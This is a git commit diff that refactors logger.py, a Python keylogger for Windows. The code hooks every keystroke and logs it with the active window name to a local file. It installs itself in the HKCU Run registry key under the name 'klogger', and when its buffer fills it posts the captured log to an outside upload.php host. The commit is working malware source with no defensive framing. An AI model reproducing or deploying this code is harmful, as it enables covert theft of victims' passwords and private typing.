529a1724122502f0209e78d1c28ddaacab7dd669
Hacker4ma <hackerama@protonmail.com>
2017-10-29 13:47:40 -0200

    update

--- logger.py
+++ logger.py
@@ -1,23 +1,20 @@
 #!/usr/bin/python
-#-*-coding:utf-8-*-
-import signal
+# -*-coding:utf-8-*-
+
 import pyHook
 import pythoncom
 import os
 import subprocess
 import requests
 import threading
-import time
-import urllib,urllib2
 
-data = ''
-head = ''
-dump = []
-def OnKey(event):
+
+def onkey(event):
     global head
     global data
     global window
     global dump
+
     file = open('C:\\captura\\captura2.txt', 'a')
 
     if event.WindowName != window:
@@ -26,13 +23,13 @@ def OnKey(event):
         file.write(head)
 
     if event.Ascii == 13:
-        data = ('<ENTER>\n')
+        data = '<ENTER>\n'
         file.write(data)
     elif event.Ascii == 8:
-        data = (' <BACK SPACE> ')
+        data = ' <BACK SPACE> '
         file.write(data)
     elif event.Ascii == 9:
-        data = (' <TAB>')
+        data = ' <TAB>'
         file.write(data)
     else:
         data = chr(event.Ascii)
@@ -43,55 +40,44 @@ def OnKey(event):
     print dump
     if len(dump) > 100:
             print ('tamanho de dump:', len(dump))
-            t = threading.Thread(target=upload, args=(fileUp,))
+            t = threading.Thread(target=upload, args=(fileup,))
             t.daemon = True
             t.start()
             dump = []
     return dump
-def handler(signum, frame):
-    print 'Esta demorando para terminar o POST', signum
-    return 0
-def counter():
-    global dump
-    print ("Counter funcionando")
 
 
-    return 0
-
-
-def upload(fileUp):
+def upload(fileup):
     global urlFromUpload, urlFromUpShow
-    if os.path.exists(fileUp):
-            files = {'file': open(fileUp, 'rb')}
+    if os.path.exists(fileup):
+            files = {'file': open(fileup, 'rb')}
             requests.post(urlFromUpload, files=files) #import requests
+
 
 def persis():
     try:
         conv = os.path.realpath(__file__).replace('.py', '.exe')
-        subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "klogger" /t REG_SZ /F /D '+conv, shell=True)
+        subprocess.call(
+          'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "klogger" /t REG_SZ /F /D '+conv, shell=True
+        )
     except Exception as e:
         print e
-urlFromUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"		# URL that contains the php ARRAY to receive files via upload
+
+urlFromUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"
 urlFromUpShow = urlFromUpload.strip('http:upload.php')
 window = None
+data = ''
+head = ''
+dump = []
+fileup = 'C:\\captura\\captura2.txt'
 persis()
-fileUp = 'C:\\captura\\captura2.txt'
-
 
 try:
     os.mkdir('C:\\captura')
-    #file = open('captura.txt', 'rb')
-   #file.close()
-    #os.chmod('C:\\captura\\captura.txt', 777)
 except:
     pass
 
-
-
 hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = OnKey
+hooks_manager.KeyDown = onkey
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
-
-
-
